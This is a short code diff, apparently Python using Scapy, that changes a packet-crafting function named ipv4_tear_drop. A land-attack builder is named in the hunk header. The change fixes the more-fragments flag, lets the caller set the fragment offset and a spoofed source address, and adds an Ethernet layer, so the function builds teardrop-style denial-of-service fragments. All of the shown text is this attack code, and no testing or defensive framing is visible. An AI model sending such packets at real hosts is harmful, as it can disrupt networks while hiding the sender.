@@ -37,19 +37,20 @@ def ipv4_land_base(smac, target):
     return pkt
 
 
-def ipv4_tear_drop(smac, flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
+def ipv4_tear_drop(smac, frag, src, dst, data, proto = 17):
     data_link_layer = Ether(
         src = smac
     )
     network_layer = IP(
         id = 28752,
-        flags = flags,
+        flags = 1,
         frag = frag,
         ttl = 128,
         proto = proto,
+        src = src,
         dst = dst
     )
-    pkt = network_layer / data
+    pkt = data_link_layer / network_layer / data
     return pkt
 
 
